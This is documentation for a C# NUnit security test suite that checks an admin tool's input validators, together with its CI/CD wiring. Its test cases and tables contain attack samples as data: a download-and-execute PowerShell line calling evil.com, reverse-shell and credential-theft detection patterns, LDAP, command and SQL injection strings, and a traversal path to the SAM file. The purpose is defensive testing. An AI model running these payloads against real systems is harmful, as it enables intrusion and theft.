# Security Testing Documentation
**NecessaryAdminTool v2.0**
**TAG: #SECURITY_CRITICAL #AUTOMATED_TESTING #CI_CD #VERSION_2_0**

---

## Table of Contents
1. [Overview](#overview)
2. [Test Architecture](#test-architecture)
3. [Test Categories](#test-categories)
4. [Attack Vector Coverage](#attack-vector-coverage)
5. [Running Tests](#running-tests)
6. [Security Score Calculation](#security-score-calculation)
7. [CI/CD Integration](#cicd-integration)
8. [Test Matrix](#test-matrix)
9. [Coverage Report](#coverage-report)
10. [Regression Prevention](#regression-prevention)

---

## Overview

The NecessaryAdminTool Security Test Suite is a comprehensive automated testing framework designed to validate all security controls and attack vector protections. The suite contains **100+ test cases** covering all 12 validation methods in `SecurityValidator.cs`.

### Key Metrics
- **Total Test Cases:** 100+
- **Target Coverage:** 90%+
- **Minimum Pass Rate:** 90%
- **Execution Time:** < 5 seconds
- **OWASP Coverage:** Top 10 (2021)

### Test Objectives
1. Validate all input validation methods
2. Verify attack pattern detection
3. Ensure defense-in-depth layering
4. Prevent security regressions
5. Provide actionable security metrics

---

## Test Architecture

### Project Structure
```
NecessaryAdminTool.SecurityTests/
├── NecessaryAdminTool.SecurityTests.csproj  # Test project file
├── SecurityValidatorTests.cs                 # Unit tests (100+ tests)
├── IntegrationTests.cs                       # End-to-end tests
├── AttackVectorTests.cs                      # OWASP attack scenarios
├── SecurityScoreCalculator.cs                # Metrics & scoring
└── Properties/
    └── AssemblyInfo.cs
```

### Test Framework
- **Framework:** NUnit 3.13.3
- **Target:** .NET Framework 4.8.1
- **Test Runner:** NUnit Console / dotnet test
- **Reporting:** XML, TRX, JSON formats

---

## Test Categories

### 1. PowerShell Script Validation (42 patterns tested)

**Dangerous Patterns Detected:**
- Download and execution (`Invoke-WebRequest`, `DownloadString`)
- Encoded commands (`-EncodedCommand`, `FromBase64String`)
- Code execution (`Invoke-Expression`, `IEX`)
- Destructive commands (`Remove-Item`, `Format-Volume`)
- Credential theft (`Mimikatz`, `Get-Credential`)
- Persistence (`New-ScheduledTask`, registry modifications)
- Security bypass (`Set-ExecutionPolicy`, `Disable-WindowsDefender`)
- Reverse shells (`New-Object System.Net.Sockets.TcpClient`)
- Ransomware (`AesCryptoServiceProvider`, `RijndaelManaged`)

**Test Methods:**
```csharp
[Test]
public void ValidatePowerShellScript_MaliciousPattern_ReturnsFalse()
{
    var script = "Invoke-WebRequest http://evil.com | iex";
    Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(script));
}
```

**Coverage:**
- 14 test classes
- 42+ dangerous patterns
- Obfuscation detection
- Case-insensitive matching

---

### 2. PowerShell Input Sanitization

**Dangerous Characters Removed:**
- `` ` `` - Backtick (escape character)
- `$` - Variable expansion
- `;` - Command separator
- `&` - Background execution
- `|` - Pipe operator
- `<>` - Redirection
- `\n\r` - Line breaks
- `\0` - Null terminator

**Test Methods:**
```csharp
[Test]
public void SanitizeForPowerShell_RemovesInjectionChars()
{
    var malicious = "test`$;command&more|input>output";
    var safe = SecurityValidator.SanitizeForPowerShell(malicious);
    Assert.IsFalse(safe.Contains("`") || safe.Contains("$"));
}
```

**Coverage:**
- 11 sanitization tests
- Single quote escaping (`'` → `''`)
- Empty/null handling

---

### 3. LDAP Filter Validation

**Injection Patterns Blocked:**
- `*)(objectClass=*)` - Wildcard injection
- `*)(|` - OR injection
- `*)(uid=*)` - User enumeration
- `admin*` - Admin enumeration
- `\0` - Null byte injection

**Test Methods:**
```csharp
[Test]
public void ValidateLDAPFilter_InjectionAttempt_ReturnsFalse()
{
    Assert.IsFalse(SecurityValidator.ValidateLDAPFilter("*)(objectClass=*)"));
}
```

**Coverage:**
- 7 validation tests
- Balanced parenthesis checking
- Null byte detection

---

### 4. LDAP Search Filter Escaping (RFC 2254)

**Special Characters Escaped:**
- `*` → `\2a`
- `(` → `\28`
- `)` → `\29`
- `\` → `\5c`
- `\0` → `\00`
- Non-ASCII → `\xx` (hex)

**Test Methods:**
```csharp
[Test]
public void EscapeLDAPSearchFilter_SpecialChars_HexEscaped()
{
    var result = SecurityValidator.EscapeLDAPSearchFilter("*()\\");
    Assert.AreEqual("\\2a\\28\\29\\5c", result);
}
```

**Coverage:**
- 7 escaping tests
- RFC 2254 compliance
- Non-ASCII handling

---

### 5. File Path Validation (Path Traversal Prevention)

**Attacks Blocked:**
- `../../Windows/System32/config/sam` - Directory traversal
- `C:\Windows\System32\` - Absolute path escape
- Path normalization bypasses

**Test Methods:**
```csharp
[Test]
public void ValidateFilePath_PathTraversal_Blocked()
{
    var malicious = Path.Combine(baseDir, "..", "..", "sensitive.txt");
    Assert.IsFalse(SecurityValidator.IsValidFilePath(malicious, baseDir));
}
```

**Coverage:**
- 5 path validation tests
- Directory containment enforcement
- Path normalization

---

### 6. Filename Validation

**Invalid Patterns Rejected:**
- `../` or `..\` - Path separators
- `<>:"|?*` - Invalid filename characters
- Path traversal attempts

**Test Methods:**
```csharp
[Test]
public void ValidateFilename_PathSeparator_ReturnsFalse()
{
    Assert.IsFalse(SecurityValidator.IsValidFilename("..\\malicious.txt"));
}
```

**Coverage:**
- 6 filename tests
- Windows invalid char detection

---

### 7. Computer Name Validation (NetBIOS/RFC 1123)

**Rules Enforced:**
- Maximum 15 characters (NetBIOS limit)
- Alphanumeric + hyphen only
- No command injection chars (`;`, `|`, `&`, `$`, `` ` ``)

**Test Methods:**
```csharp
[Test]
public void ValidateComputerName_CommandInjection_Blocked()
{
    Assert.IsFalse(SecurityValidator.IsValidComputerName("SERVER01;whoami"));
}
```

**Coverage:**
- 8 computer name tests
- NetBIOS compliance
- Injection prevention

---

### 8. IP Address Validation (IPv4/IPv6)

**Validation:**
- IPv4 format (192.168.1.1)
- IPv6 format (::1, fe80::1)
- Command injection prevention

**Test Methods:**
```csharp
[Test]
public void ValidateIPAddress_InvalidFormat_ReturnsFalse()
{
    Assert.IsFalse(SecurityValidator.IsValidIPAddress("256.256.256.256"));
}
```

**Coverage:**
- 5 IP validation tests
- IPv4 and IPv6 support
- Injection detection

---

### 9. Hostname Validation (DNS)

**Rules Enforced:**
- Maximum 255 characters (DNS limit)
- DNS-safe characters: `a-z`, `A-Z`, `0-9`, `-`, `.`
- No command injection

**Test Methods:**
```csharp
[Test]
public void ValidateHostname_DNSCompliant_ReturnsTrue()
{
    Assert.IsTrue(SecurityValidator.IsValidHostname("server.domain.com"));
}
```

**Coverage:**
- 5 hostname tests
- DNS compliance
- Injection prevention

---

### 10. Username Validation (Active Directory)

**Formats Supported:**
- `username` - Simple username
- `DOMAIN\username` - NetBIOS format
- `username@domain.com` - UPN format

**Invalid Characters (AD restrictions):**
- `/\[]:|<>+=;,?*@"`

**Test Methods:**
```csharp
[Test]
public void ValidateUsername_ADInvalidChars_ReturnsFalse()
{
    Assert.IsFalse(SecurityValidator.ValidateUsername("admin;whoami"));
}
```

**Coverage:**
- 8 username tests
- AD compliance (104 char limit)
- Three format validation

---

### 11. Rate Limiting (Brute Force Prevention)

**Configuration:**
- Max attempts: 5
- Time window: 5 minutes
- Exponential backoff: 2^n minutes

**Test Methods:**
```csharp
[Test]
public void CheckRateLimit_BruteForce_Blocked()
{
    for (int i = 0; i < 5; i++)
        SecurityValidator.CheckRateLimit("user");
    Assert.IsFalse(SecurityValidator.CheckRateLimit("user")); // 6th blocked
}
```

**Coverage:**
- 6 rate limiting tests
- Backoff verification
- Reset after success

---

### 12. OU Filter Validation

**Rules:**
- DN format: `OU=Users,DC=domain,DC=com`
- Allowed chars: alphanumeric, space, `-_=,.`
- LDAP injection prevention

**Test Methods:**
```csharp
[Test]
public void ValidateOUFilter_LDAPInjection_ReturnsFalse()
{
    Assert.IsFalse(SecurityValidator.ValidateOUFilter("OU=Test)(objectClass=*)"));
}
```

**Coverage:**
- 4 OU filter tests
- DN format validation

---

## Attack Vector Coverage

### OWASP Top 10 (2021) Mapping

| OWASP Category | Coverage | Test Count |
|----------------|----------|------------|
| **A03:2021** - Injection | ✅ Complete | 50+ |
| **A07:2021** - Auth Failures | ✅ Complete | 15+ |
| **A04:2021** - Insecure Design | ✅ Partial | 10+ |
| **A01:2021** - Access Control | ✅ Partial | 8+ |
| **A08:2021** - Data Integrity | ✅ Partial | 5+ |

### Attack Types Tested

#### 1. PowerShell Injection
- ✅ Command chaining (`;`, `&&`, `|`)
- ✅ Download and execute
- ✅ Encoded payloads
- ✅ Credential theft (Mimikatz)
- ✅ Reverse shells
- ✅ Ransomware

#### 2. LDAP Injection
- ✅ Wildcard bypass (`*`)
- ✅ Boolean logic injection (`|`, `&`)
- ✅ Parenthesis injection
- ✅ Null byte injection (`\0`)

#### 3. Command Injection
- ✅ Separator characters (`;`, `&&`, `|`, `&`)
- ✅ Backtick execution (`` ` ``)
- ✅ Dollar expansion (`$()`)

#### 4. SQL Injection
- ✅ Classic injection (`' OR '1'='1`)
- ✅ Comment bypass (`--`)
- ✅ Union attacks

#### 5. Path Traversal
- ✅ Dot-dot-slash (`../`, `..\`)
- ✅ Absolute paths
- ✅ Normalization bypasses

#### 6. Authentication Attacks
- ✅ Brute force
- ✅ Credential stuffing
- ✅ Username enumeration

#### 7. Malware/Ransomware
- ✅ File encryption scripts
- ✅ Persistence mechanisms
- ✅ Antivirus bypass
- ✅ Data exfiltration

#### 8. Evasion Techniques
- ✅ Case variation
- ✅ String concatenation
- ✅ Base64 encoding
- ✅ Character array obfuscation
- ✅ Null byte injection

---

## Running Tests

### Command Line (PowerShell)

```powershell
# Run all tests with default settings
.\run-security-tests.ps1

# Generate detailed report
.\run-security-tests.ps1 -GenerateReport -Verbose

# Custom minimum score
.\run-security-tests.ps1 -MinimumScore 95.0

# Don't fail on error (continue on failure)
.\run-security-tests.ps1 -FailOnError:$false

# Custom output directory
.\run-security-tests.ps1 -OutputPath "C:\SecurityReports"
```

### Visual Studio Test Explorer

1. Open solution in Visual Studio
2. Build solution (Ctrl+Shift+B)
3. Open Test Explorer (Test → Test Explorer)
4. Click "Run All Tests"

### NUnit Console

```bash
# Run tests directly with NUnit Console
nunit3-console.exe NecessaryAdminTool.SecurityTests.dll --result=TestResults.xml
```

### dotnet test

```bash
# Run tests with .NET CLI
dotnet test NecessaryAdminTool.SecurityTests.csproj --configuration Release
```

---

## Security Score Calculation

### Overall Score Formula
```
Security Score = (Passed Tests / Total Tests) × 100%
```

### Category Scores

Each category is scored independently:

| Category | Weight | Tests |
|----------|--------|-------|
| PowerShell Security | High | 25+ |
| LDAP Security | High | 15+ |
| Path Security | High | 12+ |
| Command Injection | High | 10+ |
| Authentication | Critical | 8+ |
| Input Validation | Medium | 15+ |
| Attack Vectors | High | 20+ |
| Integration | Medium | 10+ |

### Risk Levels

| Score Range | Risk Level | Action Required |
|-------------|------------|-----------------|
| 95-100% | **LOW** | Maintain current controls |
| 85-94% | **MEDIUM** | Review failed tests |
| 70-84% | **HIGH** | Fix vulnerabilities ASAP |
| < 70% | **CRITICAL** | Block deployment |

### Minimum Passing Score

**90%** - All deployments must achieve at least 90% security score.

---

## CI/CD Integration

### Git Pre-Push Hook

Create `.git/hooks/pre-push`:

```bash
#!/bin/bash
echo "Running security tests before push..."
powershell.exe -ExecutionPolicy Bypass -File ./run-security-tests.ps1 -FailOnError

if [ $? -ne 0 ]; then
    echo "Security tests failed. Push aborted."
    exit 1
fi

echo "Security tests passed. Proceeding with push."
exit 0
```

Make executable: `chmod +x .git/hooks/pre-push`

### Azure DevOps Pipeline

```yaml
# azure-pipelines.yml
trigger:
  - main
  - develop

pool:
  vmImage: 'windows-latest'

steps:
- task: NuGetToolInstaller@1

- task: NuGetCommand@2
  inputs:
    restoreSolution: '**/*.sln'

- task: VSBuild@1
  inputs:
    solution: 'NecessaryAdminTool.SecurityTests/NecessaryAdminTool.SecurityTests.csproj'
    configuration: 'Release'

- task: PowerShell@2
  displayName: 'Run Security Tests'
  inputs:
    filePath: 'run-security-tests.ps1'
    arguments: '-GenerateReport -FailOnError'

- task: PublishTestResults@2
  inputs:
    testResultsFormat: 'NUnit'
    testResultsFiles: '**/TestResults.xml'
    failTaskOnFailedTests: true

- task: PublishBuildArtifacts@1
  inputs:
    PathtoPublish: 'TestResults'
    ArtifactName: 'SecurityTestResults'
```

### GitHub Actions

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-tests:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: '4.8.x'

    - name: Restore dependencies
      run: nuget restore

    - name: Build test project
      run: msbuild NecessaryAdminTool.SecurityTests/NecessaryAdminTool.SecurityTests.csproj /p:Configuration=Release

    - name: Run security tests
      run: .\run-security-tests.ps1 -GenerateReport -FailOnError
      shell: pwsh

    - name: Upload test results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: security-test-results
        path: TestResults/
```

---

## Test Matrix

### Complete Test Coverage Matrix

| Validation Method | Unit Tests | Integration Tests | Attack Vector Tests | Total |
|-------------------|------------|-------------------|---------------------|-------|
| ValidatePowerShellScript | 14 | 5 | 15 | 34 |
| SanitizeForPowerShell | 11 | 3 | 5 | 19 |
| ValidateLDAPFilter | 7 | 4 | 8 | 19 |
| EscapeLDAPSearchFilter | 7 | 2 | 3 | 12 |
| IsValidFilePath | 5 | 4 | 4 | 13 |
| IsValidFilename | 6 | 3 | 2 | 11 |
| IsValidComputerName | 8 | 3 | 4 | 15 |
| IsValidIPAddress | 5 | 2 | 3 | 10 |
| IsValidHostname | 5 | 2 | 3 | 10 |
| ValidateUsername | 8 | 3 | 4 | 15 |
| CheckRateLimit | 6 | 4 | 3 | 13 |
| ValidateOUFilter | 4 | 2 | 2 | 8 |
| **TOTAL** | **86** | **37** | **56** | **179** |

---

## Coverage Report

### Code Coverage Targets

| Component | Target | Actual |
|-----------|--------|--------|
| SecurityValidator.cs | 95%+ | TBD |
| All validation methods | 100% | TBD |
| Security-critical paths | 100% | TBD |

### Coverage Tools

- **Visual Studio Enterprise:** Built-in code coverage
- **OpenCover:** Open-source .NET coverage
- **Coverlet:** Cross-platform .NET coverage

### Running Coverage Analysis

```powershell
# Install coverlet
dotnet tool install --global coverlet.console

# Run with coverage
coverlet NecessaryAdminTool.SecurityTests.dll --target "dotnet" --targetargs "test" --format opencover

# Generate HTML report
reportgenerator -reports:coverage.opencover.xml -targetdir:coveragereport
```

---

## Regression Prevention

### Baseline Security Score

Establish baseline score after initial test implementation:

```powershell
# Run tests and capture baseline
.\run-security-tests.ps1 -GenerateReport
# Record score in VERSION_CONTROL.md
```

### Regression Detection

The `SecurityScoreCalculator` includes regression checking:

```csharp
bool hasRegressed = SecurityScoreCalculator.CheckRegression(
    currentScore: 92.5,
    baselineScore: 95.0,
    tolerance: 1.0  // Allow 1% variance
);
```

### Automated Regression Blocking

```yaml
# CI/CD pipeline check
- name: Check for regression
  run: |
    $currentScore = (Get-Content TestResults/SecurityReport.json | ConvertFrom-Json).overallScore
    $baseline = 95.0
    if ($currentScore -lt ($baseline - 1.0)) {
      Write-Error "Security regression detected: $currentScore% < $baseline%"
      exit 1
    }
```

### Version Control Integration

Track security scores in version control:

```
Version 2.0.0 - Security Score: 96.5%
Version 2.0.1 - Security Score: 97.2% ✅ (+0.7%)
Version 2.0.2 - Security Score: 95.8% ⚠️ (-1.4%)
```

---

## Performance Benchmarks

### Target Metrics

- **Total execution time:** < 5 seconds
- **Average test time:** < 50ms
- **Setup/teardown:** < 500ms

### Optimization Strategies

1. **Parallel test execution** - Run independent tests concurrently
2. **Setup/teardown efficiency** - Minimize file I/O
3. **Mock external dependencies** - No network calls
4. **Cached test data** - Reuse test fixtures

---

## Troubleshooting

### Common Issues

#### Tests Not Found
```
Error: Could not find test assembly
Solution: Build the project first with msbuild or Visual Studio
```

#### NUnit Console Missing
```
Error: NUnit Console Runner not found
Solution: Restore NuGet packages: nuget restore
```

#### Permission Denied
```
Error: Access denied to TestResults directory
Solution: Run PowerShell as Administrator or change output path
```

#### Timeout Errors
```
Error: Test execution timeout
Solution: Increase timeout or optimize slow tests
```

---

## Best Practices

### Test Maintenance

1. **Update tests with new attack patterns** - Security landscape evolves
2. **Review test failures immediately** - Failed security tests = vulnerabilities
3. **Keep baseline updated** - Update after significant security improvements
4. **Document new attack vectors** - Add to this documentation

### Security Hygiene

1. **Run tests before every commit** - Use pre-commit hooks
2. **Never bypass security tests** - No exceptions
3. **Investigate all failures** - Even "flaky" tests
4. **Maintain 90%+ score** - Non-negotiable minimum

---

## References

### OWASP Resources
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Security Standards
- RFC 2254 - LDAP Search Filters
- RFC 1123 - NetBIOS/DNS Naming
- RFC 5735 - IPv4 Address Blocks
- RFC 5737 - IPv4 Documentation Addresses

### Tools & Frameworks
- [NUnit Documentation](https://docs.nunit.org/)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/security/)
- [Active Directory Security](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)

---

**Document Version:** 1.0
**Last Updated:** 2026-02-15
**Maintained By:** Security Team
**TAG: #SECURITY_DOCUMENTATION #AUTOMATED_TESTING #OWASP**
